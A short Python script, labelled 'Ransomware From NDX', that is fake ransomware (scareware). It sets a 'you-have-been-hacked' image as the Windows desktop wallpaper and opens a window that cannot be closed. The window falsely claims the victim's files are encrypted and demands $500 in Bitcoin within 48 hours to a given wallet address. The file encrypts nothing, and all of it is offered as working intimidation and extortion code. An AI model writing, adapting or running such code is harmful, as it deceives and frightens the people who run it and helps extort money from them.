import tkinter as tk
from tkinter import ttk
import ctypes
import os

# Version 2.0
# Made by NDX

def create_ransom_window():
    # Create the main window
    root = tk.Tk()
    root.title("Ransomware From NDX Warning!")
    root.geometry("400x300")  # Window size
    root.configure(bg="black")  # Black background

    # Warning title
    title_label = tk.Label(root, text="Your files have been encrypted!", font=("Arial", 16, "bold"), fg="red", bg="black")
    title_label.pack(pady=10)

    # Message content
    message_label = tk.Label(root, text="To regain access, you need to pay $500 in Bitcoin within 48 hours!", 
                             font=("Arial", 12), fg="white", bg="black", wraplength=350)
    message_label.pack(pady=10)

    # Bitcoin wallet address
    wallet_label = tk.Label(root, text="Payment Address:", font=("Arial", 12, "bold"), fg="white", bg="black")
    wallet_label.pack(pady=5)
    
    wallet_address = tk.Label(root, text="UQD-dgtrYhna4ax-vhPXjmRTiWTNa-01bEeRZHt8Wsm_l90g", 
                              font=("Courier", 10), fg="yellow", bg="black")
    wallet_address.pack(pady=5)

    # Payment deadline
    time_label = tk.Label(root, text="You have 48 hours to pay!", font=("Arial", 12), fg="white", bg="black")
    time_label.pack(pady=20)
	
    # Disable the close (X) button of the window
    root.protocol("WM_DELETE_WINDOW", lambda: None)

    label = tk.Label(root, text="Chương trình đang chạy. Bạn không thể đóng nó!")
    label.pack()
    
    # Start Tkinter's main loop
    root.mainloop()

# Change the desktop wallpaper
def change_wallpaper(image_path):
    # Check if the file exists
    if os.path.exists(image_path):
        # Call system function to change the wallpaper
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
        print("Nền máy tính đã được thay đổi.")
    else:
        print("Tệp hình ảnh không tồn tại. Vui lòng kiểm tra lại đường dẫn.")

# Function to search for the specified file
def find_image_file(file_name, search_path):
    for root, dirs, files in os.walk(search_path):
        if file_name in files:
            return os.path.join(root, file_name)
    return None

if __name__ == "__main__":
    # Specify the file name to search for
    file_name = "you-have-been-hacked.jpg"
    # Define the search path (modify this to your preferred starting directory)
    search_path = os.path.expanduser("~")  # Search in the user's home directory

    # Find the image file
    image_path = find_image_file(file_name, search_path)

    # Change the desktop wallpaper
    if image_path:  # Check if the file was found
        change_wallpaper(image_path)

        # Call the function to create the ransom window
        create_ransom_window()
    else:
        print(f"File '{file_name}' not found in '{search_path}'. Exiting.")
